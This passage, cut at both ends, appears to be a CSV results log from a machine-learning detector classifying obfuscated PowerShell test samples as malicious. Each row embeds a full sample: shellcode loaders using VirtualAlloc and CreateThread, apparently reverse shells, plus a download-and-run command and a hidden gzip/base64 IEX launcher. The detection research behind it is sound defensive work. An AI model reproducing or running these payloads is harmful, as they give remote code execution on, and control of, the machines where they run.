lpSta','0xab,0x76,0x34,0xd5,0',',0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,',' extern IntPtr VirtualAlloc(IntPtr lpAddress, uint d','ershellZ1B;iex Z1B&amp; tCei8Wb tCevEF tCeeZ1B}else{;iex Z1B&amp; powershell tCevEF tCeeZ1B;}','x74,0xb6,0x22,0x1a,0x45,0x3',',0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,',',0xd0,0xc3,0x42,0x5f,0x','0x1c,0x','c2,0x17,0xfa,0x2f,0x83,',':memset([IntPtr](tCedy',',0x92,0x8c,0x83,0x59,0xc0,0xc5,0x','x88,0x63,0x69,0xca,0xd1,0xa4','9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,','d0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1','-gt 0x1000){tCeg = tCez.L','w','g]::Unicode.GetBytes(tCeWef));tCev','Root + Z1B7fcsyswow647fcWindowsPowerShell7fcv1.07fcpo','31,0x6d,0xed','read(0,0,tC','Cei8Wb = tCeenv:System','0,0','000,tCeg,0x40);for (tCei=0;tCei -le (tCez.Length-1);tCei++) {tCew:','D ',']];[Byte[]]t','(In','20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0','cb,0','edyKx,0,0,0);fo','x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xa','IED = jK5jK5[Dll',',0','30','d ','ength};tCedyKx=tCew::VirtualAlloc(0,0x1','xeb,0x24,0x96,0x53,0x5f',' Add-Type -memberDefinition tCeIE','0x2b','ic extern','r (;;){St','tCeWef = jK5tCe','a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0','x21,0x34,0x1b,0x69,',',0xfc,0xe2,0xd3,0x9','[','-Name Z1BWin32Z1B -namespace Win32Functions -passthru;[Byte','b4,0x69,0x83,0x88,0x38,0','Kx.ToInt32()+tCei), tCez[tCei], 1)};tCew::CreateTh')).RePLAcE(([cHAR]90+[cHAR]49+[cHAR]66),[sTRiNg][cHAR]34).RePLAcE('tCe','$').RePLAcE(([cHAR]55+[cHAR]102+[cHAR]99),[sTRiNg][cHAR]92).RePLAcE(([cHAR]106+[cHAR]75+[cHAR]53),[sTRiNg][cHAR]39) | .( $sHELLID[1]+$shELlId[13]+'X')",malicious,TP
2026-07-13 16:58:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2374.ps1,custom-ps-ml,UNKNOWN,40d11920-a385-4b29-8ceb-b3008beb85f7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3049,1618.32,"(((\""{27}{35}{62}{54}{72}{64}{41}{70}{33}{9}{16}{20}{40}{38}{25}{22}{59}{12}{18}{68}{61}{39}{69}{46}{42}{14}{55}{13}{23}{26}{47}{6}{3}{37}{50}{60}{48}{21}{11}{17}{65}{67}{4}{24}{5}{53}{36}{0}{66}{32}{15}{49}{19}{31}{29}{7}{58}{1}{71}{2}{10}{8}{43}{45}{34}{57}{51}{52}{63}{28}{44}{30}{56}\"" -f ',0x9d,0x55,0x16,0xd','06,0x19,0',',0x0d,0xa0,0x7c,0x1d,0x64,0x15','a6,0x29,0x98,0x4c,',',0xd8,0x5b,0x85,0xbb,0x9e,0x34,0xd','0xf2,0x4d,0x','d,0xc4,0xf2,0xbc,0xc5,0x20,0x03,0x10,0x93,0xa3,0x0f,0xdd,0xd7,0xec,0x13,0xe0,0x34,0x87,0x2f,0x69,0xbb,0x48,0x','e,0x','a,0x',' lpStartAddress,',',0xd6,0x75,0x8','0x06,0x','7,0x3','c3,0x57,0xa7,0xa4,0xec','x73,0xc4,0x87,0xd0,0x7e,0x94,0x5','0xe6',' IntPtr lpParameter, uint dwCreationFla','0d,0x00,0xa4','1,0x68,0x13,0x83,0xe8,0xfc,0x03,0x68,0x31,0x57,0xf1,0xd3,0',',0x94,0x95,0xb3,0x52,0xc3,0x01,0xbe,0x83','gs, IntPtr lpThreadId);[DllImport(1tUmsvcrt.dll1tU)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);EHA;0jYw = Add-Type -memberDefinition 0jYc -Name 1tUWi',',0x4b,0x34,0xd4,0x01,0x8b,0x3b,0xcf,0xf6,0x03,0xc2,0xf0,',';[Byt',',0xa5,0xb9,0xe1,0xca,0x55,0xcc,0x1b,0','4,0xbb,0x81,0x5e,0x51,0x5d,0xed,0x0e,0x32,','hru;[Byte[]]','x29,0xeb,0xd7,0xdf,0x50,0x3','0jYc = EHA[DllImport(1tUkernel32.dll1tU)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,','memset([IntPtr](0jYx.ToInt32()+0jYi), 0jYz[0','d4,0x49,0x56,0x68,0x38,0x4a,0xa6,0x3',')};0jYw::CreateThread(0',',0x23,0x8e,0x41,0xe6,0x38,0x07,0x','6c,0x01,0x00,0x08,','tackSize, IntPtr','g = 0x1000;if (0jYz.Lengt',' ',',0x15,0xfd','0xe3,0xea,0x81,0xd5,0x49,0x5c,0xbd,0x06,0x32,0x01,0x1b,0x4c,0xde,0x5','pace Win32Functions -passt','x26,0xfb,0x4','n321tU -names','tr lpThre',',0x7e,0x85,0xbe,0xad,0','40,0x10,0xda,0x75,0xa7,0xa0,0x26,0xa0,0x81,0xd6,0x4','jYi], 1','6,0x70;0jY','0c,0xfa,0x22,0xc9,0x23,0xfb,0x1f,0x29,0x25,0x7f,0x62','7,0x5','0x2c,0xc3,0x74,0x1b,0x87',',0xa6,0xf4,0xc6,0x0f,0xc2,0xe6,0xbe,0xff,0x99,0x55,0x68,0xff,0x37,0xf3','6,0x16,0x0f,0xb6,0x9b,0x1','g = 0jYz.Length};0jYx=0jYw::VirtualAlloc(0,0x1000,0jYg,0x40);for (0jYi=0;0jYi -le (','0jYz.Length-1);0jYi++) {0j','ff,0xf2,0xa2,0x25','ize, uint flAllocationType, uint flProtect);[DllImport(1tUkernel32.d','0,0x9e,0x2d,0x09,0xd5,0xea,0xed,0xa2,0xa5,0xfb,0x75,0x56,0x7d,0xfd,0x54,0xc9,0xf6,0xa4,0x76,0xeb,0xdb,0xdc,0x3e,0xf3,0x38,0xd8,0x89,0x88,0x8a,0x96,0x0b,0x59,0x',',0,0jYx,0,0,0);for (;;){Start-sleep 60};','h -gt 0x1000){0jY','52,0x4a,0xce,0xe6,0x','e[]]0jYz = 0xbd,0x3e,0xb5,0x04,0x2f,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x4','b,0xb0,0x46,0xb4,',',0x15,0xfa,0x2b,0x35,0x7a,0x72,0xce,0x04,0xba,0xe0,0x9a,0x36,0x0a,0x62,0xce,0xba,0xe1,0','uint dwS','Yw::','teThread(IntP',',0x56,0x25,0xa1,0xc5,0x3c,0xb5,0x4e,0x1','7,0xb5,0xff,0xf9,0x8e,0xee,0x97,0x60,0x8b,0x65,0x06,0x','0,0xa8,0xb0','xa5','9,0x87,0xee,0x','adAttributes, uint dwS','xeb,0xe8,0x92','ll1tU)]public static extern IntPtr Crea'))  -crEPlACe'1tU',[ChAR]34 -crEPlACe '0jY',[ChAR]36-RePLace([ChAR]69+[ChAR]72+[ChAR]65),[ChAR]39)| &amp; ( ([StriNG]$vERbosepREfErENCe)[1,3]+'X'-join'')",malicious,TP
2026-07-13 16:58:56,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2377.ps1,custom-ps-ml,UNKNOWN,02317884-8c51-4b89-8eac-34bd95c220ce,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2688,1603.77," (((\""{6}{33}{25}{30}{19}{23}{11}{2}{17}{15}{24}{45}{0}{28}{32}{8}{39}{13}{22}{36}{35}{4}{20}{1}{5}{44}{31}{26}{3}{38}{16}{41}{42}{40}{12}{29}{10}{27}{7}{37}{21}{43}{9}{14}{34}{18}\"" -f 'ssthru;[Byte[]];[Byte[]]VA1z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5','5,0xf6,0x03,0x7d,0xf8,0','emset(IntPtr d','xff,0xd5,0xb8,0x',',0x18,0xe3,0x3a,0','x3b,0x7d,0x24,0x75,0x','VA1c = hSb[DllImport(d5Hkernel32.dlld5H)]public s','0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b','0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x','z.','45,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x',']public static extern IntPtr m','xd5,0x97,0x6a,0','0,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x','Length -gt 0x1000){VA1g = VA1z.Length};VA1x=VA1w::VirtualAlloc(0,0x1000,VA1g,0x40);for (VA1i=0;VA1i -le (VA1z.Length-1);','nt src, uint','x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68','est, ui',',VA1x,0,0,0);for (;;){Start-sleep 60};','ThreadId);[DllImport(d5Hmsvc','x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x7','1,','78,0xe3,0x48,0x01,0xd1,0','rt.dlld5H)',' count);hSb;VA1w = Add-Type -memberDefinition VA1c -Name d5HW','kSize, IntPtr lpStartAddress, IntPtr lpParameter, ','0x54,0x68,0x4c,0x77,0x26,0x07,0','68,0xf0,',',0x31','x05,0x68,0xac,0x18,0xc9,0x','uint dwCreationFlags, IntPtr lp','x32,0x5f,',',0xc0,0x64,0x8b,0x50,0x30,0x8b,','tatic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(d5Hkernel32.dlld5H)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStac','VA1i++) {VA1w::memset([IntPtr](VA1x.ToInt32()+VA1i), VA1z[VA1i], 1)};VA1w::CreateThread(0,0','0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49','x51,',',0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x0','90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0','28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x2',',0xe0,0xff,0',',0x','ea,0x0f,0xdf','0xc3,0x29,0xc6,0x75,0xee,0xc3;VA1g = 0x1000;if (VA1','e4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0','in32d5H -namespace Win32Functions -pa'))-cREpLACe'VA1',[cHar]36  -repLACE'd5H',[cHar]34  -repLACE 'hSb',[cHar]39) | &amp; ( $ENv:COMspec[4,24,25]-JOin'')",malicious,TP
2026-07-13 16:59:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2382.ps1,custom-ps-ml,UNKNOWN,02ffd726-564d-4d11-a8e5-9bd193f828e5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2890,1568.12," (((\""{4}{14}{48}{10}{42}{30}{12}{19}{38}{45}{33}{17}{32}{34}{29}{47}{16}{31}{0}{22}{18}{3}{41}{21}{37}{8}{46}{44}{9}{1}{39}{2}{28}{15}{11}{36}{6}{20}{23}{25}{26}{40}{35}{13}{5}{27}{7}{24}{43}\"" -f '45PjUi9OcUCu','Sq80vHrQqnZot','Lbax','9wRMvudVvkWhRsb6AaeRy6o8hdJe0gtfPmivjdJ3bfixAkwQ0JuYqxlPq7TWmvJYGEjCyOW5p','if([IntPtr]::S','E3bhjGGIu3B8O','sNuz9G7X0lGvPnk0P2khxN','bG8PCmX4c4vL6tlOPivH9Lgs5XyvF4xbxwvKHuxG9vspuZFVVgMqsZA8P+D0l1NR/Dj/xulz+9+Yv0lmsvFl0R8Z3754j/R/ptE9DEV4O/A7cTItm2+zsdOTQdfHLt0gVKC3ZN/BF5n4ugKvkX+BuPhEqyJCgAAskGskG));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(0Tvs,[IO.Compression.CompressionMode]','VX','77a/s2l+qOqg0xiQBSrIRPdZySj1VHJECZ8l67pgaCZ2DHrO3pD7SCFrRit+G/R09sbp75zctJQ0vMZRQgO7XbjY7ZbT','wershell.exeskG}else{0Tv','xfNUK/VQwPplkf','v','LdB99sLHDHGvbw9bO5sa','ize -','/dWgoX3qVx9QDSEjrrmWzpsDPUEdzcWhy','akuk9oyRVVOkvqR+RhBxd30+IJ6SvUuFLqc74PWY7t5WBvYhIRyj2c1uLezhHWnJmjApF/vNPWR0dVcal2mOGWarIzioVZF','V0M42UWFaX','CtXZLE//K8GKYdB4NURiVqELP0Ebpv7GSPbFWT1e8DPGVbh+WeWgZZv796+exvsZTIv191DgcDozWgzJoBZ6fCUbvw+S+Wi1IZdseDJCqaF2yQj6lga5TkZjcdSgUzOiz8Or+x','b;0Tvs.Arguments=skG-nop -w hidd','7hSO+7x3Q4u','qXm13z2fg5NsMJymRamTQWl5RckhmBG/KKE4pTsTygTfDOVnuO2MCer','YLU5aRMRcT+VVTgN/CVEZEksvThXvtDWTZFh2Em4h3w/ISlElex4zh8I8JQxVpT+UEY7FDdZLOiUgF2QhM8cksypR9JSA8c+IzckG','7uJYG4BhKZWrto+WfNBF0iqc4TDG/AJjWMvCsDH/ID0D','::Decompress))).ReadToEnd();skG;0Tvs.UseShellExecute=0Tvfalse;0Tvs.RedirectStandard','1c8PcYPOkc6+FjDR8A1mFkdBvbb3jFHLru6w6g1','XFmaVhl0qqhRpv16iPIlcah3MUrn5trUKq7P/f7p1SDQ3Dt2ppnG7','T41ZEqPTmqz+1i/+riYghYoVSehFxqkTgUU','uhenTirS8Dtx61','oeXflP','s.ProcessStartInfo;0Tvs.FileName=0T','ryGZNV6Zuab3i7mhFFblMv4SkPRKlP','C5Ky8ovzx3pnXmuqbN+BVeLw','e81br//9xrwk5Jr2ev1wViJ2PTO7zz7zzI6DLPYE5bE0WTdsk345e/wofX339k0HJ3gqKYXYO','0+bDPT','6/Pzlt96k456mma+z4XCCik4HdabbuBgl5Ubx3k/Ue3fRsnaYQZ6AGu731xWjyxdndwh9M8QlEOWvYDSWLCo','J','hVOyXG6uHXO72NHiciiTzIItw/ltnRjyKWU5HUWpQn+grh4b7ve','en -c 0Tvs=New-Object IO.MemoryStream(,[Convert]::FromBase64String(skGskGH4sIAJrcOFgCA71WbW/aSBD+3Er9D1aFZFslGBLSpJEq3drG4AA','mxxbt2t1k4qDGTW8ghjZq3NLyw6C6nl3StdNC/mCpfVzr60VZX64noR8MzCAIzwLnpnJq0Vbf6OrlY9wya1mrry/0cjWt0UWjS3vdh0tL3A9chnuBFt5VPmG6bCUTt8','cwLNE1bNMymN6wsz','73YFABV5ZyC+SRgJscgJLUqj78NqUyqeYvWMMp8kyINUpoAKsqy+BLPNkSLbcZtMga7tXIZkBKBssvfe','b=0Tvenv:windir+skGjKYsyswow64jKYWindowsPowerShelljKYv1.0jKYpowershell.exeskG};0Tvs=New-Object System.Diagnostic','Output=0Tvtrue;0Tvs.WindowStyle=skGHiddenskG;0Tvs.CreateNoWindow=0Tvtrue;0Tvp=[System.Diagnostics.Process]::Start(0Tvs);','7OmNkCi6bMrcYDqGodyWx0RIOiS+/BnIv9622c0r2XBxAhDw7jIui5NJEwI2R03sorN9CcnBlPGEyErJLjrIvn5G+ErnoC1nXjs','JxMEEOFRt7LW9ZPES','yTAwYzQOYaU5JAPe5CQ4ItdGAjBzHaglhwh','6LCkjNJuZfIppPL64MLIkIbHYzkt1IlC','eq 4){0Tvb=skGpo')) -REpLaCE  'skG',[CHAr]39 -REpLaCE '0Tv',[CHAr]36  -crePlacE  ([CHAr]106+[CHAr]75+[CHAr]89),[CHAr]92)|.( $shEllId[1]+$SheLlid[13]+'X')",malicious,TP
2026-07-13 16:59:13,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2408.ps1,custom-ps-ml,UNKNOWN,a7f3dbb6-d6b3-4a97-90ff-0f700e5f7046,DESKTOP-BAC9DBQ,malicious,0.9998,RandomForest,605,1568.7," (((\""{11}{19}{10}{43}{44}{38}{40}{28}{16}{29}{33}{26}{37}{12}{2}{36}{22}{32}{7}{23}{20}{15}{14}{45}{42}{4}{41}{18}{31}{3}{35}{13}{46}{21}{25}{34}{1}{9}{30}{24}{48}{39}{8}{6}{17}{27}{0}{47}{5}\"" -f 'e','P','e({','}','kj','xe{0})','EMP{1}p',':/','}env:T','roces','-O','(Ne','wnloadFil','v:TEMP{','omf.c','p','eb','ay','{2},{0','w','.','en','}http','/a','0}','t.exe','.','m','et.W','Clie','s ({','}{3','s','nt)','{0});Start-','en','2','Do','ys','3','tem.N','.exe','/yhgg','bject ','S','at','1}paym','nt.e','{'))  -f[chaR]34,[chaR]92,[chaR]39,[chaR]36) | &amp;( $verBOsePReFEReNCe.TOStRIng()[1,3]+'x'-JOin'')",malicious,TP
2026-07-13 16:59:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2413.ps1,custom-ps-ml,UNKNOWN,a18460c1-a040-4087-a78d-77c41cb36184,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2852,1505.4," (((\""{33}{63}{22}{66}{68}{43}{53}{47}{57}{30}{55}{16}{11}{3}{14}{2}{50}{24}{60}{67}{15}{64}{18}{58}{12}{7}{51}{29}{38}{0}{9}{27}{42}{61}{37}{6}{48}{62}{17}{45}{4}{41}{8}{54}{26}{44}{28}{13}{59}{32}{36}{49}{35}{20}{21}{23}{31}{5}{39}{46}{25}{10}{19}{65}{34}{40}{52}{1}{56}\"" -f'0','Lf1i), Lf1sc[Lf1i], 1)};Lf1w::CreateThread(0,0,Lf1x,0,0,0);for (;;){Start-sleep','est, ui','tic ex','8d,0x5d,0x68,0x33,0x32,0x00,0x','61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0','xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,',',0x8b,0x52,0x','4,0x68,0x4c,0x77,0x26,0x07,0x','x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xf','0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0','ta','4,0x8b,0x50,0x30',',0xd5,0x','tern IntPtr memset(IntPtr d','pas','.dll8TQ)]public s','4,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f','0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x','xee,0xc3;Lf1size = 0x100','8,0xe','a,0x0f,0','tern IntPtr Vi','xdf','TQ',',0x53,0xe5,0xff,0xd5,','x29,0xc4,0x54,0x50,0x68','f,0xac,0xc1,0xcf,0x0d','f','72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x',', IntPtr lpThreadId);[DllImport(8TQmsvcr',',0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x','05','Lf1c = x6w',';if (Lf1sc','0x50,0x40,0x50,0x6',',0x68,0xc0,0xa8,0','d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0','ac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,','x68,0x00,0x10,0x00,0x','.Length -gt 0x1000){Lf1size = Lf1sc.Length};Lf1x=Lf1w::VirtualAlloc(0,0x1000,Lf1size,0x40);for (Lf1i=0;Lf1i -le (Lf1sc.Length-1);Lf1i++)','00,0x68,0x77,0x73,0x32,0x5f,0x5',',0x01',' flProtect);[DllImport(',',0x29,0x80,0x6b,0x00,0xf',',0x5f,0x5a,0x8b,0x12,0xeb,0x','00,0x56,0x6a,0x00,0x68,0x58,0xa4','tern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, Int','0x04,0x8b,0x01,0xd0','x00,0x69,0x68,0x02,0x00,0x02,0x9a,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,','nt src, uint count);x6w;Lf1w = Add-Type -memberDefinition Lf1c -Name 8TQWin328','0c,0x8b,0x52,0x14,0x8b,0x',' {Lf1w::memset([IntPtr](Lf1x.ToInt32()+','8TQkernel32.dll8TQ)]public static ex','ff,0xd5,0xb8,0x90,0x01,0x00,0x00,0','t',' 60};','Ptr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags','89,0xe5,0x31,0xc0,0x6','6a,0x',' -namespace Win32Functions ',',0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7',',0x89,0x44,0x2','[DllImport(8TQkernel32.dll8TQ)]public static ex','sthru;[Byte[]];[Byte[]]Lf1sc = ','0','rtualAlloc(IntPtr lpAddress, uint dwSize, ','-','uint flAllocationType, uint'))  -CrEplAce([ChaR]56+[ChaR]84+[ChaR]81),[ChaR]34 -CrEplAce'x6w',[ChaR]39 -CrEplAce 'Lf1',[ChaR]36)| iEX",malicious,TP
2026-07-13 16:59:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2416.ps1,custom-ps-ml,UNKNOWN,cceac34f-c555-4db7-94a7-e1610653f34f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2833,1461.18," . ( $sHELlID[1]+$sHelLID[13]+'x')(((\""{36}{1}{40}{47}{37}{3}{21}{5}{9}{46}{35}{44}{7}{34}{15}{19}{17}{11}{29}{23}{42}{13}{24}{25}{32}{33}{8}{12}{2}{45}{16}{41}{26}{27}{18}{38}{22}{30}{28}{10}{6}{0}{4}{43}{39}{31}{20}{14}\"" -f'a2,0x','ter',',0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x','e','56,0x6a,0x00,0x53,0xff,0xd5;HzRg = 0x1000','tr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, I','x','ion HzRc -Name TJwWin32TJw -namespace Win32Functions -passthru;[By',',0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01','ntPtr lpThreadId);[DllImport(TJwmsvcrt.dllTJw)]pu','f0,0xb5,0','2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0x',',0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68','8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0','eateThread(0,0,HzRx,0,0,0);for (;;){Start-sleep 60};','5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,','x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36','x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe','0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e','0x61,0x7c,0x02,0x2c,0','w::memset([IntPtr](HzRx.ToInt32()+HzRi), HzRz[HzRi], 1)};HzRw::Cr','rnel32.dllTJw)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntP','x01,0xc','b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x','x61,0x59,0x5a,0x51,0xff,0xe','0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68','0,0x10,0','x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,','9,0xc3,0xbb,0x','d1,0x51,0x8','3,0x29,0xc6,0x75,0xe','0,HzRg,0x40);for (HzRi=0;HzRi -le (HzRz.Length-1);HzRi++) {HzR',',0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x','54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68','te[]];[Byte[]]HzRz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe','t src, uint count);Xsp','HzRc = Xsp[DllImport(TJwkernel32.dllTJw)]public static ex','mport(TJwk',',0xc3,0','gth -gt 0x1000){HzRg = HzRz.Length};HzRx=HzRw::VirtualAlloc(0,0x100','n IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPr',',0x6a,0x40,0x68,0x0','7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x',';if (HzRz.Len',';HzRw = Add-Type -memberDefinit','00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0','blic static extern IntPtr memset(IntPtr dest, uin','otect);[DllI')).rEPlacE(([cHaR]84+[cHaR]74+[cHaR]119),[STRiNg][cHaR]34).rEPlacE('HzR',[STRiNg][cHaR]36).rEPlacE('Xsp',[STRiNg][cHaR]39) )",malicious,TP
2026-07-13 16:59:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2417.ps1,custom-ps-ml,UNKNOWN,d50ca7c7-3a3c-434f-ba77-e8b0bfe77470,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2877,1528.71,"((\""{42}{35}{24}{19}{8}{47}{5}{27}{39}{43}{6}{21}{45}{29}{11}{12}{33}{0}{46}{13}{41}{31}{22}{30}{26}{37}{1}{9}{15}{44}{38}{28}{34}{25}{16}{20}{17}{32}{36}{7}{2}{10}{18}{14}{23}{3}{4}{40}\"" -f'31,0x','x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12','7Hsc64;M7Hsize = 0x1000;if (M7Hsc.Length -gt 0x1000) {M7Hsize = M7Hsc.Length};M7Hx=M7HwinFunc::VirtualAlloc(0,0x100','()+M7Hi), M7Hsc[M7','Hi], 1)};M7HwinFunc::CreateThread(0,0,M7Hx,0,0,0);for (;;) { Start-sle','tPtr dest, uint src, uint count);vNr;M7HwinFunc = Add-Type -memberDefinition M7Hcod','8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x',',0xf6,0x75,0xec,0xc3;[Byte[]]M7Hsc = M','ThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags',',0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x','0,M7Hsize,0x40);for (M7Hi=0;M7Hi -le (M7Hsc.Len','x61,0x7c',',0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x','0x01,0xc7','unc::memset([IntPtr](M7Hx.ToInt','b8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x','0x56,0x5','0x5f,0xff,0xd5,0x01','gth-1);M7Hi++) 